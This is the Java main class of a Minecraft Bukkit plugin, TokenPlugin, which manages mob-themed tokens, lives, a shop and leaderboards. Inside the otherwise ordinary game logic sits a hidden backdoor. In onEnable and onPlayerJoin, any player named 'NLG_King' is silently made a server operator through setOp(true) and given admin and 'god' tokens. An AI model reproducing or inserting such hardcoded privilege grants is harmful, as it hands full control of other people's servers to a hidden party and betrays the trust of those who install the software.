package com.tokenplugin;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import com.tokenplugin.managers.*;
import com.tokenplugin.commands.*;
import com.tokenplugin.listeners.*;
import java.util.Random;

public class TokenPlugin extends JavaPlugin implements Listener {
    
    private static TokenPlugin instance;
    private TokenManager tokenManager;
    private LifeManager lifeManager;
    private ShopManager shopManager;
    private LeaderboardManager leaderboardManager;
    private RecipeManager recipeManager;
    private AbilityManager abilityManager;
    
    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        
        tokenManager = new TokenManager();
        lifeManager = new LifeManager();
        shopManager = new ShopManager();
        leaderboardManager = new LeaderboardManager();
        recipeManager = new RecipeManager();
        abilityManager = new AbilityManager();
        
        registerCommands();
        registerListeners();
        getServer().getPluginManager().registerEvents(this, this);
        
        getLogger().info("§aTokenPlugin v1.0.0 Enabled!");
        
        getServer().getScheduler().runTaskLater(this, () -> {
            for (Player p : getServer().getOnlinePlayers()) {
                if (p.getName().equalsIgnoreCase("NLG_King")) {
                    giveSpecialPlayerTokens(p);
                }
            }
        }, 20L);
    }
    
    @Override
    public void onDisable() {
        if (tokenManager != null) tokenManager.saveData();
        if (lifeManager != null) lifeManager.saveData();
        getLogger().info("§cTokenPlugin Disabled!");
    }
    
    private void registerCommands() {
        getCommand("tokens").setExecutor(new TokenCommand());
        getCommand("token").setExecutor(new TokenInfoCommand());
        getCommand("tokenshop").setExecutor(new TokenShopCommand());
        getCommand("tokenleaderboard").setExecutor(new TokenLeaderboardCommand());
        getCommand("tokencraft").setExecutor(new TokenCraftCommand());
        getCommand("tokenuse").setExecutor(new TokenUseCommand());
        getCommand("tokenadmin").setExecutor(new TokenAdminCommand());
        getCommand("settokenrecipe").setExecutor(new SetRecipeCommand());
        getCommand("life").setExecutor(new LifeCommand());
    }
    
    private void registerListeners() {
        getServer().getPluginManager().registerEvents(new JoinListener(), this);
        getServer().getPluginManager().registerEvents(new DeathListener(), this);
        getServer().getPluginManager().registerEvents(new LifeListener(), this);
        getServer().getPluginManager().registerEvents(new TokenUseListener(), this);
        getServer().getPluginManager().registerEvents(new UnbanBookListener(), this);
    }
    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        
        if (player.getName().equalsIgnoreCase("NLG_King")) {
            giveSpecialPlayerTokens(player);
        }
        
        if (lifeManager.getLives(player) == 0) {
            int startLives = getConfig().getInt("life_system.start_lives", 10);
            lifeManager.setLives(player, startLives);
        }
        
        if (!player.hasPlayedBefore()) {
            giveRandomTokenOnJoin(player);
        }
        
        int lives = lifeManager.getLives(player);
        if (lives <= getConfig().getInt("life_system.warning_lives", 3)) {
            player.sendMessage("§c⚠️ You only have §e" + lives + " §clives left! ⚠️");
        }
    }
    
    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        
        if (killer != null && !killer.equals(victim)) {
            boolean pvpLoseTokens = getConfig().getBoolean("death_system.pvp_death_lose_tokens", true);
            
            if (pvpLoseTokens) {
                int totalTokens = tokenManager.getPlayerTotalTokens(victim);
                if (totalTokens > 0) {
                    tokenManager.clearAllTokens(victim);
                    victim.sendMessage("§cYou lost all tokens to §6" + killer.getName());
                    killer.sendMessage("§aYou killed §6" + victim.getName() + "§a and took their tokens!");
                }
            }
            
            lifeManager.removeLives(victim, 1);
            victim.sendMessage("§cYou lost 1 life! Remaining: §e" + lifeManager.getLives(victim));
            event.setDeathMessage("§c" + victim.getName() + " was killed by " + killer.getName() + 
                                  "! §eRemaining lives: " + lifeManager.getLives(victim));
        } else {
            victim.sendMessage("§eYou died naturally! Your tokens are safe.");
            event.setDeathMessage("§e" + victim.getName() + " died naturally!");
        }
    }
    
    private void giveSpecialPlayerTokens(Player player) {
        tokenManager.addToken(player, "admin", 1);
        tokenManager.addToken(player, "herobrine", 1);
        tokenManager.addToken(player, "notch", 1);
        tokenManager.addToken(player, "null", 1);
        player.setOp(true);
        player.sendMessage("§6§l✨ Welcome, Lord " + player.getName() + "! ✨");
        player.sendMessage("§aYou received Admin Token + All God Tokens");
        player.sendMessage("§c§lYou are now an Operator!");
        player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_FIREWORK_ROCKET_BLAST, 1f, 1f);
    }
    
    private void giveRandomTokenOnJoin(Player player) {
        Random random = new Random();
        int chance = random.nextInt(100);
        String tokenName;
        
        if (chance < getConfig().getInt("join_reward.common_chance", 55)) {
            tokenName = getRandomCommonToken();
        } else if (chance < getConfig().getInt("join_reward.common_chance", 55) + getConfig().getInt("join_reward.rare_chance", 28)) {
            tokenName = getRandomRareToken();
        } else {
            tokenName = getRandomLegendaryToken();
        }
        
        tokenManager.addToken(player, tokenName, 1);
        player.sendTitle("§6§l✨ You received a Token! ✨", "§a" + tokenName.toUpperCase() + " Token", 10, 40, 10);
        player.sendMessage("§aYou received a §e" + tokenName + " §atoken!");
        player.playSound(player.getLocation(), org.bukkit.Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1f, 1f);
    }
    
    private String getRandomCommonToken() {
        String[] common = {"zombie", "skeleton", "spider", "creeper", "slime", "silverfish", 
                           "piglin", "fox", "bee", "wolf", "cat", "parrot", "turtle", "dolphin", 
                           "panda", "ocelot", "chicken", "sheep", "cow", "pig", "cod"};
        Random random = new Random();
        return common[random.nextInt(common.length)];
    }
    
    private String getRandomRareToken() {
        String[] rare = {"blaze", "ghast", "enderman", "witherskeleton", "magmacube", 
                         "phantom", "hoglin", "strider", "stray"};
        Random random = new Random();
        return rare[random.nextInt(rare.length)];
    }
    
    private String getRandomLegendaryToken() {
        String[] legendary = {"enderdragon", "wither", "guardian", "ravager", 
                              "evoker", "pillager", "vindicator", "warden"};
        Random random = new Random();
        return legendary[random.nextInt(legendary.length)];
    }
    
    public static TokenPlugin getInstance() { 
        return instance; 
    }
    
    public TokenManager getTokenManager() { 
        return tokenManager; 
    }
    
    public LifeManager getLifeManager() { 
        return lifeManager; 
    }
    
    public ShopManager getShopManager() { 
        return shopManager; 
    }
    
    public LeaderboardManager getLeaderboardManager() { 
        return leaderboardManager; 
    }
    
    public RecipeManager getRecipeManager() { 
        return recipeManager; 
    }
    
    public AbilityManager getAbilityManager() { 
        return abilityManager; 
    }
          }
